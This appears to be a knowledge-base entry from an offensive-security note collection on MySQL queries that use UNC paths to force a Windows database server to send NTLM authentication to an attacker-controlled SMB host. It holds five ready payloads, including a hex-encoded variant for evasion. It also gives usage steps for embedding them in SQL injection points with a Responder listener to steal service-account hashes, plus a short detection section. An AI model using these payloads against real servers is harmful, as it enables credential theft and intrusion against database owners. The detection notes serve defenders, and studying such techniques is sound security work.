---
id: 47df459d-f2af-4fda-bfdb-eefc16c1dea8
name: MySQL-UNC-Path-Load-File-Queries
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.075187Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mysql-injection
  - unc-path
  - ntlm-stealing
validated: true
---

# MySQL-UNC-Path-Load-File-Queries

## Code

```sql
select load_file('\\error\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\error\abc';
select 'osanda' into outfile '\\error\abc';
load data infile '\\error\abc' into table database.table_name;
```

## Description

This SQL code snippet contains multiple variants of MySQL queries using UNC paths to trigger out-of-band SMB authentication requests from a Windows MySQL server. The LOAD_FILE reads from a UNC share, INTO DUMPFILE/OUTFILE writes to it, and LOAD DATA INFILE loads from it, all forcing NTLM hash leakage when executed against an attacker-controlled endpoint. Use this in SQL injection payloads or direct queries to steal service account hashes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| error | Attacker hostname or IP in UNC path (\\error\abc) | 10.0.0.5 |
| abc | Fake share name to trigger auth without existing share | temp |
| 0x5c5c5c5c6572726f725c5c616263 | Hex-encoded UNC path for evasion (\\error\\abc) | 0x5c5c10.0.0.5\temp |
| osanda | Dummy data to write (arbitrary string) | test |
| database.table_name | Target table for LOAD DATA (must exist) | tempdb.temp_table |

## Usage

Embed these queries into a vulnerable SQL injection point or execute directly via MySQL client after setting up an SMB listener like Responder. For example, in a blind SQLi, use the LOAD_FILE variant to trigger the OOB request without relying on in-band responses. Ensure the UNC path points to your IP: replace 'error' with your resolvable hostname or IP.

## Detection

- MySQL error logs showing UNC path access attempts (e.g., "Can't open file \\attacker_ip\share").
- Network traffic: Outbound SMB (port 445) from DB server to unusual IPs; use Zeek or Suricata for SMB NTLM signatures.
- Windows Event Logs: Event ID 4776 (NTLM auth) or 4624 (logon attempts) from lsass.exe or MySQL process.
- WAF/IDS rules for SQLi payloads containing UNC patterns like '\\\\' or hex-encoded backslashes.

## Related

- [[procedures/MySQL-Out-of-Band-UNC-Path-NTLM-Hash-Stealing]]
- [[tools/Responder]]
